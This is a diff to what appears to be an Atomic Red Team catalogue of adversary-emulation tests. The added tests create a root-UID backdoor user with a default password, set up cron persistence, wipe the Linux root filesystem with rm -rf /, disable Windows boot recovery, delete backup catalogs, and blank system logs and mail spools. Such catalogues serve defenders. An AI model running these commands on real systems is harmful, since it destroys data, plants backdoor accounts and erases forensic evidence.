@@ -1156,6 +1156,27 @@ persistence:
         command: |
           New-LocalUser -Name #{username} -NoPassword
           net user /add #{username}
+    - name: Create a new user in Linux with `root` UID and GID.
+      description: 'Creates a new user in Linux and adds the user to the `root` group.
+        This technique was used by adversaries during the Butter attack campaign.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: butter
+        password:
+          description: Password of the user to create
+          type: String
+          default: BetterWithButter
+      executor:
+        name: bash
+        command: |-
+          useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
+          echo "#{password}" | passwd --stdin #{username}
   T1158:
     technique:
       id: attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93
@@ -2125,8 +2146,10 @@ persistence:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -2135,19 +2158,47 @@ persistence:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
@@ -5354,7 +5405,7 @@ defense-evasion:
 
 '
     - name: bcdedit
-      description: 'xxx
+      description: 'This test leverages `bcdedit` to remove boot-time recovery measures.
 
 '
       supported_platforms:
@@ -5365,14 +5416,27 @@ defense-evasion:
           bcdedit /set {default} bootstatuspolicy ignoreallfailures
           bcdedit /set {default} recoveryenabled no
     - name: wbadmin
-      description: 'xxx
-
-'
+      description: "This test deletes Windows Backup catalogs. \n"
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'wbadmin delete catalog -quiet
+
+'
+    - name: Delete Filesystem - Linux
+      description: 'This test deletes the entire root filesystem of a Linux system.
+        This technique was used by Amnesia IoT malware to avoid analysis. This test
+        is dangerous and destructive, do NOT use on production equipment.
+
+'
+      supported_platforms:
+      - linux
+      - centos
+      - ubuntu
+      executor:
+        name: bash
+        command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
 
 '
   T1222:
@@ -6535,6 +6599,39 @@ defense-evasion:
         command: |
           rm -rf /private/var/log/system.log*
           rm -rf /private/var/audit/*
+    - name: Overwrite Linux Mail Spool
+      description: 'This test overwrites the Linux mail spool of a specified user.
+        This technique was used by threat actor Rocke during the exploitation of Linux
+        web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        username:
+          description: Username of mail spool
+          type: String
+          default: root
+      executor:
+        name: bash
+        command: 'echo 0> /var/spool/mail/#{username}
+
+'
+    - name: Overwrite Linux Log
+      description: 'This test overwrites the specified log. This technique was used
+        by threat actor Rocke during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        log_path:
+          description: Path of specified log
+          type: Path
+          default: "/var/log/secure"
+      executor:
+        name: bash
+        command: 'echo 0> #{log_path}'
   T1202:
     technique:
       id: attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e
@@ -14998,8 +15095,10 @@ execution:
       created: '2017-12-14T16:46:06.044Z'
       identifier: T1168
     atomic_tests:
-    - name: Cron Job
-      description: 'Set a cron job
+    - name: Cron - Replace crontab with referenced file
+      description: 'This test replaces the current user''s crontab file with the contents
+        of the referenced file. This technique was used by numerous IoT automated
+        exploitation attacks.
 
 '
       supported_platforms:
@@ -15008,19 +15107,47 @@ execution:
       - ubuntu
       - linux
       input_arguments:
-        script:
-          description: Script to execute
-          type: path
+        command:
+          description: Command to execute
+          type: string
           default: "/tmp/evil.sh"
+        tmp_cron:
+          description: Temporary reference file to hold evil cron schedule
+          type: path
+          default: "/tmp/persistevil"
       executor:
-        name: sh
-        command: 'echo "* * * * * #{script}" > /tmp/persistevil && crontab /tmp/persistevil
+        name: bash
+        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
 
 '
-    - name: Cron Job
-      description: 'Manually set a cron job
+    - name: Cron - Add script to cron folder
+      description: 'This test adds a script to a cron folder configured to execute
+        on a schedule. This technique was used by the threat actor Rocke during the
+        exploitation of Linux web servers.
 
 '
+      supported_platforms:
+      - macos
+      - centos
+      - ubuntu
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in cron folder
+          type: string
+          default: persistevil
+      executor:
+        name: bash
+        command: 'echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+
+'
+    - name: Event Monitor Daemon Persistence
+      description: "This test adds persistence via a plist to execute via the macOS
+        Event Monitor Daemon. \n"
       supported_platforms:
       - macos
       - centos
